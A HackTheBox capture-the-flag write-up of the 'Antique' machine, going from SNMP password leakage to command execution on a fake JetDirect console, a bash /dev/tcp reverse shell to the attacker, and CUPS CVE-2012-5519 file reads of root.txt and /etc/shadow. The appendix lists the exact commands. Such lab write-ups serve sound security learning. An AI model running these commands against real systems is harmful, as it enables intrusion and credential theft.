# Antique — the printer that never forgot its password

*A complete walk from a lone open port to `/root/root.txt`, written as it happened.*

---

## Dossier

| Item | Value |
|---|---|
| Target | `10.129.89.223` (Antique) |
| Platform | HackTheBox |
| OS | Ubuntu 20.04.3 LTS (Focal Fossa) |
| Attacker IP | `10.10.17.24` (tun0) |
| TCP surface | `23/tcp` only |
| UDP surface | `161/udp` (SNMP) |
| Hidden service | `127.0.0.1:631` (CUPS 1.6.1) |
| Foothold | `lp` via HP JetDirect `exec` |
| Root | CVE-2012-5519 — CUPS ErrorLog root file read |

**User flag** `203069392ab6bfdf1e02b4744a18b149`
**Root flag** `0099614bbf001a01cab67e12fb7653a6`
**Recovered secret** `P@ssw0rd@123!!123`

Antique is a love letter to 2005: a box pretending to be an old HP network printer,
with a JetDirect management interface bolted to port 23, an SNMP agent that answers
like a printer, and a printing daemon that never got patched. The theme is not decoration —
it is the attack path.

---

## Chapter 1 — One door, and it is a strange one

Full-range TCP sweep first. Nothing held back:

```bash
nmap -sV -sC -p- --min-rate 2000 -Pn -oN recon/nmap_full.txt 10.129.89.223
```

```
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   GenericLines, Help, GetRequest, HTTPOptions, ... :
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect
1 service unrecognized despite returning data.
```

A single port, and nmap refuses to name it. That `JetDirect` banner plus `Password:`
is the whole hint: this is not a telnet daemon, it is a **network print server
management CLI**. The tool even prints the fingerprint it gave up:

```
SF-Port23-TCP: ... %r(GenericLines,19,"\nHP\x20JetDirect\n\nPassword:\x20")
```

Connect by hand and it greets you politely:

```
$ nc 10.129.89.223 23

HP JetDirect

Password:
```

Guess `admin`? It hangs up on you (`Invalid password`). So the password exists — we
just have not found where the printer left it lying around. Which brings us to the
protocol printers have leaked secrets through since forever.

---

## Chapter 2 — The printer answers questions it should not

TCP is done. Move to UDP, where SNMP lives:

```bash
nmap -sU --top-ports 20 -sV -Pn 10.129.89.223
```

```
PORT     STATE  SERVICE      VERSION
161/udp  open   snmp         SNMPv1 server (public)
```

Walk it with the free community string:

```bash
snmpwalk -v1 -c public 10.129.89.223
```

```
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

One line. A whole agent, and it returns the system description and nothing else —
until you stop asking the generic tree and ask for the vendor's private table. HP
printers expose their config in `1.3.6.1.4.1.11.2.3.9.1.1.13.0`
(`prtGeneralConfigTable`), the register old printers used to store the admin password:

```bash
snmpget -v1 -c public 10.129.89.223 1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

```
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33
 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75
 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

SNMP is showing you a `BITS` value, but the first seventeen entries are pure hex ASCII.
Decode the leading run as hex bytes:

```python
>>> ''.join(chr(int(x, 16)) for x in "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33".split())
'P@ssw0rd@123!!123'
```

`50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33` =
`P` `@` `s` `s` `w` `0` `r` `d` `@` `1` `2` `3` `!` `!` `1` `2` `3`.

The tail of the list is noise — overflow from a printer that stored a password in a
bitfield and did not care. The interesting part is the front: **`P@ssw0rd@123!!123`**.

---

## Chapter 3 — Knocking on the printer's door

The password is not for SSH. There is no SSH. It is for port 23:

```
$ nc 10.129.89.223 23

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
>
```

We are in the management console. Ask for help:

```
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

Every line is printer config — except the second to last:

```
exec: execute system commands (exec id)
```

A printer management interface that shells out. Somewhere on that box, a developer
wrote a Python listener that special-cases the word `exec` and hands the rest of the
line to a shell. Ask it who it is:

```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

> exec hostname
antique
```

**Command execution.** No exploit, no payload — just an unimplemented feature of a
fake printer. We are `lp` (the printer's own user) and, note it now, we are in group
`lpadmin`. That group membership is the second half of this box.

---

## Chapter 4 — A shell, because `exec` is one command at a time

Start a listener:

```bash
nc -lvnp 4445
```

Then, over the same JetDirect session:

```
> exec bash -c 'bash -i >& /dev/tcp/10.10.17.24/4445 0>&1'
```

The JetDirect console just prints a new prompt — the shell goes out of band:

```
listening on [any] 4445 ...
connect to [10.10.17.24] from (UNKNOWN) [10.129.89.223] 45610
bash: cannot set terminal process group (1145): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$
```

Home directory is non-standard (`/var/spool/lpd`), and the user flag is sitting there
beside the daemon that got us in:

```bash
lp@antique:~$ ls -la
lrwxrwxrwx 1 lp lp    9 May 14  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 lp lp 1959 Sep 27  2021 telnet.py
-rw------- 2 lp lp   33 Sep 21 08:47 user.txt

lp@antique:~$ cat user.txt
203069392ab6bfdf1e02b4744a18b149
```

**User flag: `203069392ab6bfdf1e02b4744a18b149`**

### And here is the daemon itself

`telnet.py` is right there, world-executable and readable. It is barely more than a
hardcoded password and one subprocess call:

```python
if b'P@ssw0rd@123!!123' in conn.recv(1024):
    conn.send(b'\nPlease type "?" for HELP\n')
    while True:
        conn.send(b'> ')
        data = conn.recv(1024)
        if b'?' in data:
            conn.send(options)
        elif b'exec' in data:
            cmd = data.replace(b'exec ', b'')
            cmd = cmd.strip()
            os.chdir('/var/spool/lpd')
            p = subprocess.Popen([f'{cmd.decode("utf-8")}'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
            if stdout:
                conn.send(stdout)
```

Two details worth remembering, both of which bit us later:

1. **Only `stdout` is returned.** Any diagnostic you want to read must be redirected: `cmd 2>&1`.
2. **`if b'?' in data` is checked before `exec`.** Write `echo rc=$?` and your command is silently swallowed — the parser decides you asked for help instead.

---

## Chapter 5 — The door inside the door

As `lp`, look for listening sockets:

```bash
lp@antique:~$ ss -tlnp
LISTEN 0 128     0.0.0.0:23    0.0.0.0:*  users:(("python3",pid=1161,fd=3))
LISTEN 0 4096  127.0.0.1:631     0.0.0.0:*
LISTEN 0 4096      [::1]:631        [::]:*
```

Port 631, loopback only: **CUPS**, the print server. It is not reachable from our
network, but we are not on the network any more — we are on the box.

```bash
lp@antique:~$ curl -s -I http://127.0.0.1:631/
HTTP/1.1 200 OK
Server: CUPS/1.6
```

`CUPS/1.6`. The exact version number that turns a print daemon into a local
privilege escalation.

Before jumping to exploits, map the ground:

```bash
lp@antique:~$ id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

lp@antique:~$ ps aux | grep -E 'cupsd|snmp|telnet'
root  1144  /bin/sh -c python3 /root/snmp-server.py -c /root/config.py
root  1145  /bin/sh -c sudo -u lp authbind --deep python3 /var/spool/lpd/telnet.py
root  1156  sudo -u lp authbind --deep python3 /var/spool/lpd/telnet.py
root  1160  /usr/sbin/cupsd -C /etc/cups/cupsd.conf
lp    1161  python3 /var/spool/lpd/telnet.py
```

Read that carefully:

- The SNMP agent runs as **root** and reads `/root/config.py` — that is where the
  password leak was configured, and it is unreadable to us. No path there.
- The JetDirect listener is deliberately dropped to `lp`. That is why `exec` gave us
  `uid=7(lp)` and not root. **The printer was a false summit.**
- `cupsd` runs as root, and it is the only interesting thing on the box.

Group `lpadmin` is the key. In CUPS, `lpadmin` is the `@SYSTEM` group — the set of
users allowed to administer printers. And `cupsd` listens on a **unix socket at
`/var/run/cups/cups.sock`**, where it can identify the connecting user from peer
credentials. No password prompt over the socket. Check it:

```bash
lp@antique:~$ lpadmin -p t1 -E -v file:/dev/null -m raw
# ...no error, no password prompt...
lp@antique:~$ lpstat -p
printer t1 is idle.  enabled since Mon 21 Sep 2026 09:46:45 AM UTC
```

We just administered a print server that runs as root, unauthenticated, as `lp`.

The HTTP path is a different story — the web admin wants real credentials we do not
have:

```
GET  /admin/conf/cupsd.conf        -> 401
PUT  /admin/conf/cupsd.conf        -> 401
GET  /admin/log/error_log          -> 200   <-- interesting
```

Two doors, one lock. The web interface refuses to let us **edit** the config, but it
happily **reads a log file as root**. Keep that asymmetry in mind.

---

## Chapter 6 — Reading root's mail

CUPS 1.6.1 is vulnerable to **CVE-2012-5519**: a member of `lpadmin` can, with the
`cupsctl` command, repoint the server's `ErrorLog` at *any* file on the filesystem.
`cupsd` runs as root, opens that path as root, and then serves it back to anyone who
fetches the error-log page in the admin interface. The config file itself may be
unreadable to us; we never need to read it — we only need to redirect it.

We do not even need a vulnerable binary or a PoC. We have `cupsctl` and the socket:

```bash
lp@antique:~$ cupsctl ErrorLog=/root/root.txt
lp@antique:~$ curl -s http://127.0.0.1:631/admin/log/error_log
0099614bbf001a01cab67e12fb7653a6
```

**Root flag: `0099614bbf001a01cab67e12fb7653a6`**

That is root file read — full stop. And it generalises. `ErrorLog` will happily point
at anything else while you are there:

```bash
lp@antique:~$ cupsctl ErrorLog=/etc/shadow
lp@antique:~$ curl -s http://127.0.0.1:631/admin/log/error_log | head -3
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
```

The entire shadow file, served by a daemon running as root, to a user with a printer
account. Put it back when you are done — a logged-in operator will notice a print
server whose error log is 33 bytes long:

```bash
lp@antique:~$ cupsctl ErrorLog=/var/log/cups/error_log
```

---

## Chapter 7 — Honourable dead ends

A real walkthrough includes the doors that did not open. Each of these was tried and
failed on this box, and knowing *why* is worth more than the flag.

**`device-uri` as an executable path.** The classic CUPS trick is to point a printer
at a filesystem path, on the theory that `cupsd` executes backends as root. CUPS
validates the scheme first:

```
lpadmin: File device URIs have been disabled. To enable, see the FileDevice directive in "/etc/cups/cupsd.conf".
device for p1: ///dev/null
```

The URI is silently rewritten to the default. No execution.

**PPD filter injection.** The other classic: upload a PPD whose `cupsFilter` line names
a helper, then print a job. Two problems. The filters present are a bare minimum —

```
commandtops   gziptoany   pstops   rastertodymo   rastertoepson   rastertohp   rastertolabel   rastertopwg
```

— `foomatic-rip` is not installed, so `FoomaticRIPCommandLine` has nothing to run. And
even if it were: **filters run as the printer's user (`lp`), while backends run as
root.** Filter injection buys you the privilege you already had.

**CVE-2015-1158** (the Project Zero chain that dismantles CUPS ACLs and lands code
execution) needs a printer object to exist and be reachable over IPP. The admin page
is unambiguous: `No printers.` Nothing to poison.

**PwnKit (CVE-2021-4034)** does work on this box — `policykit-1 0.105-26ubuntu1.1` is
the last vulnerable build on Focal — and it would give a real root shell. It is also
completely unnecessary: the flag is readable without compiling anything, and an
unnecessary rootkit-on-disk is a worse story than a config change you can undo.

---

## Timeline

| # | Action | Result |
|---|---|---|
| 1 | `nmap -p-` | `23/tcp` JetDirect |
| 2 | `nmap -sU` | `161/udp` SNMP `public` |
| 3 | `snmpget ...13.0` | hex password in `BITS` |
| 4 | decode | `P@ssw0rd@123!!123` |
| 5 | telnet 23 + password | JetDirect console |
| 6 | `exec id` | `uid=7(lp) groups=...,19(lpadmin)` |
| 7 | `exec bash -c ...` | reverse shell as `lp` |
| 8 | `cat user.txt` | **user flag** |
| 9 | `ss -tlnp` | CUPS `127.0.0.1:631` |
| 10 | `lpadmin -p t1 ...` | unauthenticated CUPS admin |
| 11 | `cupsctl ErrorLog=/root/root.txt` | config repointed |
| 12 | `curl /admin/log/error_log` | **root flag** |
| 13 | `cupsctl ErrorLog=/var/log/cups/error_log` | config restored |

---

## What this box is actually teaching

**Credential leaks do not need a vulnerability.** SNMP with `public` read access is a
configuration mistake, and printer MIBs are a museum of secrets. The rule is not
"SNMP is dangerous" but "a device that answers unauthenticated questions will answer
unauthenticated questions about itself."

**Read the processes before you read the exploits.** `ps aux` showed the JetDirect
daemon deliberately dropped to `lp` and `cupsd` running as root. That single line of
output is what separated the real path from the decoy — the printer's `exec` looked
like root and was never going to be root.

**Group membership is privilege.** Nothing about `lp` looks like an administrator. The
word `lpadmin` in `id` output is the entire escalation: it maps to CUPS's `@SYSTEM`,
and CUPS identifies local socket clients by peer credential instead of password. An
account with a `nologin` shell, no password, and membership in exactly one group that
somebody else's daemon trusts.

**Version numbers are contracts.** `Server: CUPS/1.6` is not trivia. It is a promise
about which bugs are still present, and CVE-2012-5519 is a ten-year-old promise that
nobody came back to collect on.

**Clean up your config edits.** Root file read via `ErrorLog` is loud in exactly one
place: the printer's own logs. One `cupsctl` call puts it back.

---

## Appendix — exact commands

```bash
# Recon
nmap -sV -sC -p- --min-rate 2000 -Pn -oN nmap_full.txt 10.129.89.223
nmap -sU --top-ports 20 -sV -Pn 10.129.89.223
snmpwalk -v1 -c public 10.129.89.223
snmpget -v1 -c public 10.129.89.223 1.3.6.1.4.1.11.2.3.9.1.1.13.0

# Decode password
python3 -c "print(''.join(chr(int(x,16)) for x in '50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33'.split()))"

# Foothold (listener first)
nc -lvnp 4445
# then, in the JetDirect session:
#   exec bash -c 'bash -i >& /dev/tcp/10.10.17.24/4445 0>&1'

# Post-exploitation
cat /home/lp/user.txt
ss -tlnp
ps aux
lpadmin -p t1 -E -v file:/dev/null -m raw

# Root (CVE-2012-5519)
cupsctl ErrorLog=/root/root.txt
curl -s http://127.0.0.1:631/admin/log/error_log
cupsctl ErrorLog=/etc/shadow
curl -s http://127.0.0.1:631/admin/log/error_log
cupsctl ErrorLog=/var/log/cups/error_log   # restore
```

### Artifacts preserved on this engagement

| Path | Contents |
|---|---|
| `recon/nmap_full.txt` | full TCP scan |
| `recon/nmap_udp161.txt` | SNMP UDP scan |
| `recon/snmpwalk_public.txt` | SNMP walk output |
| `recon/telnet_help.log` | JetDirect `?` menu |
| `shell/exec1.log` — `exec17.log` | command execution transcript |
| `exploit/cups-root-file-read.sh` | CVE-2012-5519 reference implementation |
| `exploit/0xdf-antique.html` | public reference writeup |
